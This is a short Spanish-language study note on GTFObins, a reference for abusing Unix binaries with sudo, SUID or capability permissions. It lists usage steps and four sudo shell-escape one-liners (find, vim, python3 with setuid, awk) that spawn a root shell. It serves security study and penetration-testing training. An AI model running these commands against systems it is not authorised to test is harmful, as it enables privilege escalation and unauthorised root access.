## GTFObins

**GTFObins** es una guía de referencia que documenta cómo abusar de binarios de Unix con **permisos especiales** (SUID / sudo / capabilities) para escalar privilegios o escapar de restricciones.

Web oficial:
```
https://gtfobins.github.io/
```

### Cómo usarla

1. Encuentra un binario que puedas ejecutar con permisos elevados (con `sudo -l`, un SUID, o capabilities).
2. Busca ese binario en GTFObins.
3. Copia el payload de la sección que aplique (**SUID**, **sudo**, **capabilities**...).
4. Ejecútalo en la máquina objetivo.

### Ejemplos típicos

Binarios comunes que aparecen en GTFObins y su payload clásico de `sudo`:

```bash
# find (se pueden usar -exec para lanzar shell)
sudo find / -exec /bin/sh \;

# vim
sudo vim -c ':!sh'

# python3 (también usable con cap_setuid)
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

> ⚠️ **Regla de oro para estudiar:** mira siempre el payload que **rompe los permisos** (el que te da root), pero intenta entender *por qué* funciona. Está directamente relacionado con los apuntes de [Escalada Linux](Linux/Basico.md).